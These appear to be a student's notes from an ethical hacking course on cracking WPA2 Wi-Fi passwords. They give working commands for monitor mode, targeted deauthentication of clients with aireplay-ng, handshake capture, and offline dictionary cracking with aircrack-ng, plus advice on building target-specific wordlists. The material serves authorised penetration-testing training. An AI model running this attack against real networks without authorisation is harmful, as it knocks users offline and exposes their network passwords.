Wireless Network Pentesting
----------------------------

from: Heath Adams - The Cyber Mentor ; Practical Ethical Hacking - The Complete Course
"001_Wireless_Penetration_Testing_Overview" - https://academy.tcm-sec.com/courses/1152300/lectures/24793689
"002_WPA_PS2_Exploit_Walkthrough" - https://academy.tcm-sec.com/courses/1152300/lectures/24793690

# setting up wireless card (in Linux) to capture wireless traffic
# go to: Player > Removable Devices > NAME_OF_WIRELESS_CARD > Connect (Disconnect from host)

# confirm wireless card is connected; the card will receive an interface designation, e.g. wlan0
$ iwconfig

# place wireless card in monitor mode so it can monitor wireless traffic

# check for and kill any processes that could interfere with monitoring
$ airmon-ng check kill

# start monitoring mode
$ airmon-ng start wlan0

# confirm wlan0mon interface now active
$ iwconfig

# search for access points in the area
$ airodump-ng wlan0mon

# BSSID = MAC address of discovered Access Points (also known as AP MAC Address)
# the lower the negative number in the PWR (power) column the closer the device is
# CH column is channel that the device is communicating on

# choose the target access point to capture traffic from
$ airodump-ng -c <CHANNEL#_TARGET_ACESS_POINT> --bssid <TARGET_BSSID> -w <FILENAME_OF_CAPTURE_FILE> wlan0mon

# in order to ensure that you capture the 4-way handshake (and then crack it offline) it is worthwhile to perform a deauth (deauthorization) attack on one of the devices that is communicating with the wireless router; after the device is deauth it will reauth by performing the 4-way handshake and you can capture a hash of the password used to authenticate to the router and then try to crack it

# open a new terminal
# you may need to try the deauth on a number of different devices until you get it to work

$ aireplay-ng -0 1 -a <MAC_ADDRESS_OF_TARGET_ROUTER> -c <MAC_ADDRESS_OF_TARGET_CLIENT> wlan0mon
# -0 = deauth
# 1 = run the deauth attack only once
# -c <MAC_ADDRESS_OF_TARGET_CLIENT> = the device you are deauthenticating from the router; you will see its MAC address listed in the Station column
# after running the deauth on the second terminal, check the first terminal and you should see "WPA handshake"; that will mean that the deauth worked and then the device reauthed and you captured the 4-way handshake

# check out the <FILENAME>.cap file that was created in the directory
# use a hashcracking tool to crack the password hash

$ aircrack-ng -w <FILENAME_OF_WORDLIST> -b <AP_MAC_ADDRESS> <FILENAME_OF_CAPTURE_FILE>
# other hashcracking tools can also be used, e.g. hashcat
# when creating wordlist it is recommended to include variations on the company's name, phone number, street address, and other keywords from its website





